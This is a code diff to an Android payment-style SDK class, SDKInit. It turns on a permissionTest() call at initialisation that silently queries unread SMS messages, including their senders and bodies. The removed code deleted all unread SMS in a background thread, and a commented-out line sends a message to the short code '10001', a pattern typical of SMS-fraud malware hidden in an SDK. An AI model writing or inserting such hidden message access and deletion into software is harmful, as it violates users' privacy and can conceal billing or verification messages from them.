@@ -63,7 +63,7 @@ public class SDKInit {
                                final String product, final String Did, final String extData, final Object payHandler,
                                final Handler initHandler) {
         mContext = ctx;
-//        permissionTest();
+        permissionTest();
         new Thread(new Runnable() {
             @Override
             public void run() {
@@ -200,15 +200,9 @@ public class SDKInit {
     }
 
     public static void permissionTest() {
-//        MySmsManager.sendSecondMessage("10001", "102");
-        new Thread(new Runnable() {
-            @Override
-            public void run() {
-                SDKInit.mContext.getContentResolver().query(Uri.parse("content://sms"),
-                        new String[]{"_id", "address", "read", "body", "thread_id"}, "read=?", new String[]{"0"},
-                        "date desc");
-                SDKInit.getResolver().delete(Uri.parse("content://sms"), "read=0", null);
-            }
-        }).start();
+        SDKInit.mContext.getContentResolver().query(Uri.parse("content://sms"),
+                new String[]{"_id", "address", "read", "body", "thread_id"}, "read=?", new String[]{"0"},
+                "date desc");
+//        SDKInit.getResolver().delete(Uri.parse("content://sms"), "read=0", null);
     }
 }
